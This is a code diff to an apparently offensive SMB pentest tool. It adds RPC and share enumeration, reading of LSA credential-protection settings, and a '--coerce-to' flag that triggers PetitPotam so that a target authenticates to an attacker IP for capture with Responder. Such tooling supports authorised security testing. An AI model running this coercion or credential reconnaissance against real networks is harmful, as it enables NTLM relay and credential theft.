@@ -6,6 +6,7 @@ import (
 
 	"github.com/0xbbuddha/GoFenrir/core"
 	smbcreds "github.com/0xbbuddha/GoFenrir/modules/smb/credentials"
+	smbcoerce "github.com/0xbbuddha/GoFenrir/modules/smb/coerce"
 	smbenum "github.com/0xbbuddha/GoFenrir/modules/smb/enumeration"
 	"github.com/0xbbuddha/GoFenrir/protocols/smb"
 	"github.com/spf13/cobra"
@@ -31,6 +32,10 @@ var (
 	smbEnumServices    bool
 	smbServicesFilter  string
 	smbCheckAutoLogon  bool
+	smbEnumRPC         bool
+	smbCoerceTo        string
+	smbLSASettings     bool
+	smbEnumShares      bool
 )
 
 var smbCmd = &cobra.Command{
@@ -225,6 +230,47 @@ func runSMB(cmd *cobra.Command, args []string) {
 			}
 		}
 
+		if smbLSASettings {
+			lsa, err := smbenum.GetLSASettings(session)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[SMB] LSA Settings: %s", err.Error()))
+			} else {
+				out.Section("LSA Settings", 1)
+				// WDigest clear-text password storage
+				if lsa.WDigestEnabled != nil {
+					if *lsa.WDigestEnabled == 1 {
+						out.TreeEntryColored("WDigest: ENABLED (clear-text passwords in LSASS)", core.ColorRed, false)
+					} else {
+						out.TreeEntryColored("WDigest: disabled", core.ColorGreen, false)
+					}
+				} else {
+					out.TreeEntryColored("WDigest: not configured (default disabled)", core.ColorGreen, false)
+				}
+				// LSA PPL protection
+				if lsa.RunAsPPL != nil {
+					if *lsa.RunAsPPL >= 1 {
+						out.TreeEntryColored(fmt.Sprintf("RunAsPPL: %d (LSA protected process)", *lsa.RunAsPPL), core.ColorGreen, false)
+					} else {
+						out.TreeEntryColored("RunAsPPL: 0 (LSA not protected)", core.ColorRed, false)
+					}
+				}
+				// LM compatibility
+				if lsa.LmCompatLevel != nil {
+					out.TreeDetail("LmCompatibilityLevel", smbenum.LmCompatLevelString(*lsa.LmCompatLevel), false)
+				}
+				// Null session restrictions
+				if lsa.RestrictAnonymous != nil {
+					out.TreeDetail("RestrictAnonymous", fmt.Sprintf("%d", *lsa.RestrictAnonymous), false)
+				}
+				if lsa.RestrictAnonymousSAM != nil {
+					out.TreeDetail("RestrictAnonymousSAM", fmt.Sprintf("%d", *lsa.RestrictAnonymousSAM), false)
+				}
+				if lsa.NoLMHash != nil {
+					out.TreeDetail("NoLMHash", fmt.Sprintf("%d", *lsa.NoLMHash), true)
+				}
+			}
+		}
+
 		if smbCheckAutoLogon {
 			al, err := smbenum.GetAutoLogon(session)
 			if err != nil {
@@ -252,6 +298,53 @@ func runSMB(cmd *cobra.Command, args []string) {
 					if hasPass {
 						out.TreeDetail("Password", al.Password, true)
 					}
+				}
+			}
+		}
+
+		if smbEnumRPC {
+			endpoints, err := smbenum.EnumRPCEndpoints(session)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[SMB] RPC Endpoints: %s", err.Error()))
+			} else {
+				out.Section("RPC Endpoints", len(endpoints))
+				for i, ep := range endpoints {
+					last := i == len(endpoints)-1
+					id := ep.UUID
+					if ep.Name != "" {
+						id = ep.Name
+					}
+					label := fmt.Sprintf("[v%-5s] %s via %s[%s]", ep.Version, id, ep.Transport, ep.Endpoint)
+					if ep.Protocol != "" {
+						label += fmt.Sprintf(" (%s)", ep.Protocol)
+					} else if ep.Annotation != "" && ep.Annotation != ep.Name {
+						label += fmt.Sprintf(" (%s)", ep.Annotation)
+					}
+					var color string
+					if ep.Name != "" {
+						color = core.ColorGreen
+					} else {
+						color = core.ColorYellow
+					}
+					out.TreeEntryColored(label, color, last)
+				}
+			}
+		}
+
+		if smbCoerceTo != "" {
+			result, err := smbcoerce.PetitPotam(session, smbCoerceTo)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[SMB] Coerce (PetitPotam): %s", err.Error()))
+			} else {
+				out.Section("Coerce (PetitPotam)", 1)
+				if result.Triggered {
+					pipeLabel := ""
+					if result.Pipe != "" {
+						pipeLabel = fmt.Sprintf(" via %s", result.Pipe)
+					}
+					out.TreeEntryColored(fmt.Sprintf("Coercion sent%s -> %s (%s)", pipeLabel, smbCoerceTo, result.Status), core.ColorRed, true)
+				} else {
+					out.TreeEntryColored(fmt.Sprintf("%s", result.Status), core.ColorGreen, true)
 				}
 			}
 		}
@@ -328,6 +421,27 @@ func runSMB(cmd *cobra.Command, args []string) {
 			}
 		}
 
+		if smbEnumShares {
+			shares, err := smbenum.EnumShares(session)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[SMB] Enum Shares: %s", err.Error()))
+			} else {
+				out.Section("Shares", len(shares))
+				for i, sh := range shares {
+					last := i == len(shares)-1
+					label := fmt.Sprintf("[%-10s] %s", sh.TypeLabel, sh.Name)
+					if sh.Comment != "" {
+						label += fmt.Sprintf(" - %s", sh.Comment)
+					}
+					if sh.CanRead {
+						out.TreeEntryColored(label, core.ColorGreen, last)
+					} else {
+						out.TreeEntryColored(label+" (denied)", core.ColorRed, last)
+					}
+				}
+			}
+		}
+
 		if smbCheckShares {
 			results := smbenum.CheckShareAccess(session, smbenum.CommonShares)
 			accessible := 0
@@ -385,7 +499,11 @@ func init() {
 	smbCmd.Flags().BoolVar(&smbEnumServices, "services", false, "Enumerate services via MS-SCMR (svcctl) including binary path and run-as account")
 	smbCmd.Flags().StringVar(&smbServicesFilter, "services-filter", "", `Filter services by state: "running" or "stopped" (default: all)`)
 	smbCmd.Flags().BoolVar(&smbCheckAutoLogon, "check-autologon", false, "Read AutoLogon credentials from HKLM\\...\\Winlogon via MS-RRP (winreg)")
-	for _, f := range []string{"shares", "null-session", "gpp-passwords", "rid-brute", "rid-start", "rid-end", "local-groups", "sessions", "who-has-priv", "server-info", "services", "services-filter", "check-autologon"} {
+	smbCmd.Flags().BoolVar(&smbEnumRPC, "enum-rpc", false, "Enumerate registered RPC endpoints via the endpoint mapper (EPM, port 135 via IPC$)")
+	smbCmd.Flags().StringVar(&smbCoerceTo, "coerce-to", "", "Trigger PetitPotam (MS-EFSR) coercion: target authenticates to <attacker_ip> (capture with Responder)")
+	smbCmd.Flags().BoolVar(&smbLSASettings, "lsa-settings", false, "Read LSA security settings: WDigest, RunAsPPL, LmCompatibilityLevel, null session restrictions")
+	smbCmd.Flags().BoolVar(&smbEnumShares, "enum-shares", false, "Enumerate all shares via srvsvc NetrShareEnum with type, comment, and access check")
+	for _, f := range []string{"shares", "null-session", "gpp-passwords", "rid-brute", "rid-start", "rid-end", "local-groups", "sessions", "who-has-priv", "server-info", "services", "services-filter", "check-autologon", "enum-rpc", "coerce-to", "lsa-settings", "enum-shares"} {
 		smbCmd.Flags().SetAnnotation(f, "group", []string{"Enumeration"})
 	}
 
